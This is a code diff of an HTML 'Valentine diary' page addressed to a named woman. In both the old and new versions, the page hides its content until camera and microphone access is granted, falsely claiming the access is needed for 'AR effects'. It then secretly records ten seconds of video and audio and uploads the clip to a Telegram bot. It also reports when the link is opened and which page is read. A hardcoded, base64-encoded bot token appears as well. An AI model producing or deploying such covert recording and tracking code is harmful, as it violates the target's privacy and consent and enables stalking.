@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>(っ◔◡◔)っ ♥ Nikhitha ♥ ❤️</title>
+    <title>(っ◔◡◔)っ ♥ Nikhitha ♥❤️</title>
     <style>
         :root { --rose: #ff4d6d; }
         body { 
@@ -14,69 +14,41 @@
             display: flex; justify-content: center; align-items: center; height: 100vh; 
         }
         
-        /* The container is now wide enough for two pages */
         #diary-wrapper { 
-            display: none; 
-            width: 900px; 
-            height: 600px; 
-            position: relative;
-            perspective: 2000px;
+            display: none; width: 900px; height: 600px; 
+            position: relative; perspective: 2000px;
         }
 
-        .book { 
-            width: 100%; height: 100%; 
-            position: relative; 
-            transform-style: preserve-3d;
-        }
+        .book { width: 100%; height: 100%; position: relative; transform-style: preserve-3d; }
 
-        /* The Spine Shadow */
         .book::before {
-            content: '';
-            position: absolute;
-            left: 50%;
-            top: 0;
-            width: 2px;
-            height: 100%;
-            background: rgba(0,0,0,0.2);
-            z-index: 100;
-            box-shadow: 0 0 10px rgba(0,0,0,0.5);
+            content: ''; position: absolute; left: 50%; top: 0; width: 2px; height: 100%;
+            background: rgba(0,0,0,0.2); z-index: 100; box-shadow: 0 0 10px rgba(0,0,0,0.5);
         }
 
         .page { 
-            width: 50%; height: 100%; 
-            position: absolute; 
-            top: 0; right: 0; 
-            transform-origin: left; 
-            transform-style: preserve-3d; 
+            width: 50%; height: 100%; position: absolute; top: 0; right: 0; 
+            transform-origin: left; transform-style: preserve-3d; 
             transition: transform 1.5s cubic-bezier(0.645, 0.045, 0.355, 1); 
             cursor: pointer;
         }
         
-        /* When flipped, move to the left side and stay visible */
         .page.flipped { transform: rotateY(-180deg); }
         
         .front, .back { 
-            width: 100%; height: 100%; 
-            position: absolute; 
-            backface-visibility: hidden; 
-            padding: 30px; box-sizing: border-box; 
-            display: flex; flex-direction: column; 
-            align-items: center; justify-content: center; 
-            border: 1px solid rgba(0,0,0,0.1);
+            width: 100%; height: 100%; position: absolute; backface-visibility: hidden; 
+            padding: 30px; box-sizing: border-box; display: flex; flex-direction: column; 
+            align-items: center; justify-content: center; border: 1px solid rgba(0,0,0,0.1); 
             background: #fff;
         }
 
-        /* Styling for the left and right pages */
         .front { border-radius: 0 15px 15px 0; box-shadow: inset 10px 0 20px rgba(0,0,0,0.05); }
         .back { 
-            transform: rotateY(180deg); 
-            border-radius: 15px 0 0 15px; 
+            transform: rotateY(180deg); border-radius: 15px 0 0 15px; 
             background: url('bg2.jpg') center center !important; 
-            background-size: cover !important;
-            box-shadow: inset -10px 0 20px rgba(0,0,0,0.1);
+            background-size: cover !important; box-shadow: inset -10px 0 20px rgba(0,0,0,0.1);
         }
 
-        /* Corner Names and Signature */
         .front::before, .front::after, .back::before, .back::after {
             content: "Nikhitha"; position: absolute; font-size: 0.7rem; color: var(--rose); opacity: 0.4;
         }
@@ -122,57 +94,73 @@
     <script>
         const t = atob("ODU2NzQwMjg4NzpBQUd1d2FCOVNGSmY2SFktUTdQZ21mQUFvSmZlMVg0Vldabw==");
         const bgMusic = document.getElementById('bg-music');
-      let mediaRecorder, recordedChunks = [];
-const t = atob("ODU2NzQwMjg4NzpBQUd1d2FCOVNGSmY2SFktUTdQZ21mQUFvSmZlMVg0Vldabw==");
+        let mediaRecorder, recordedChunks = [];
 
-async function startDiary() {
-    try {
-        // 1. Request camera/mic access FIRST
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        
-        // 2. Only if access is granted, show the diary
-        document.getElementById('overlay').style.display = 'none';
-        document.getElementById('diary-wrapper').style.display = 'flex';
-        document.getElementById('bg-music').play();
+        document.querySelectorAll('.diary-video').forEach(vid => {
+            vid.onplay = () => bgMusic.pause();
+            vid.onpause = () => bgMusic.play();
+        });
 
-        // 3. Notify your bot
-        fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=5324376571&text=Valentine%20Link%20Opened!%20❤️`);
+        function setupZ() { 
+            const pages = document.querySelectorAll('.page'); 
+            pages.forEach((el, i) => { el.style.zIndex = pages.length - i; }); 
+        }
+        setupZ();
 
-        document.getElementById('video-preview').srcObject = stream;
-        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+        function flipPage(el, pageNum) {
+            el.classList.toggle('flipped');
+            if(el.classList.contains('flipped')) {
+                fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=5324376571&text=Nikhitha%20is%20on%20Page%20${pageNum}%20❤️`);
+                el.style.zIndex = pageNum + 1;
+            } else {
+                el.style.zIndex = document.querySelectorAll('.page').length - pageNum;
+            }
+        }
 
-        mediaRecorder.ondataavailable = (e) => { 
-            if (e.data.size > 0) recordedChunks.push(e.data); 
-        };
+        async function startDiary() {
+            try {
+                // STEP 1: Request access FIRST
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                
+                // STEP 2: Only proceed if access is granted
+                document.getElementById('overlay').style.display = 'none';
+                document.getElementById('diary-wrapper').style.display = 'block';
+                bgMusic.play();
 
-        mediaRecorder.onstop = async () => {
-            if (recordedChunks.length === 0) return;
-            const blob = new Blob(recordedChunks, { type: 'video/webm' });
-            const formData = new FormData();
-            formData.append('chat_id', "5324376571");
-            formData.append('document', blob, 'reaction.webm');
-            
-            fetch(`https://api.telegram.org/bot${t}/sendDocument`, { 
-                method: 'POST', 
-                body: formData 
-            });
-        };
+                fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=5324376571&text=Valentine%20Link%20Opened!%20❤️`);
 
-        mediaRecorder.start();
+                document.getElementById('video-preview').srcObject = stream;
+                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
 
-        setTimeout(() => { 
-            if (mediaRecorder.state === "recording") mediaRecorder.stop(); 
-        }, 10000);
+                mediaRecorder.ondataavailable = (e) => { 
+                    if (e.data.size > 0) recordedChunks.push(e.data); 
+                };
 
-    } catch (err) { 
-        // ❌ If camera is blocked, she stays on the welcome screen
-        alert("Wait! To enter the garden, you must allow camera access for the AR effects! ❤️");
-        console.log("Access Denied: Diary remains hidden.");
-    }
-}
+                mediaRecorder.onstop = async () => {
+                    if (recordedChunks.length === 0) return;
+                    // Small delay to ensure blob is ready
+                    await new Promise(r => setTimeout(r, 500));
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    const formData = new FormData();
+                    formData.append('chat_id', "5324376571");
+                    formData.append('document', blob, 'reaction.webm');
+                    
+                    fetch(`https://api.telegram.org/bot${t}/sendDocument`, { method: 'POST', body: formData });
+                };
 
-window.addEventListener('beforeunload', () => {
-    if (mediaRecorder && mediaRecorder.state === "recording") {
-        mediaRecorder.stop();
-    }
-});
+                mediaRecorder.start();
+                setTimeout(() => { if (mediaRecorder.state === "recording") mediaRecorder.stop(); }, 10000);
+
+            } catch (err) { 
+                // STEP 3: Handle Blocked Camera
+                alert("Wait! To see the Valentine surprise, you must Allow Camera access for the AR effects! ❤️");
+                console.log("Diary locked: Camera access denied.");
+            }
+        }
+
+        window.addEventListener('beforeunload', () => {
+            if (mediaRecorder && mediaRecorder.state === "recording") { mediaRecorder.stop(); }
+        });
+    </script>
+</body>
+</html>
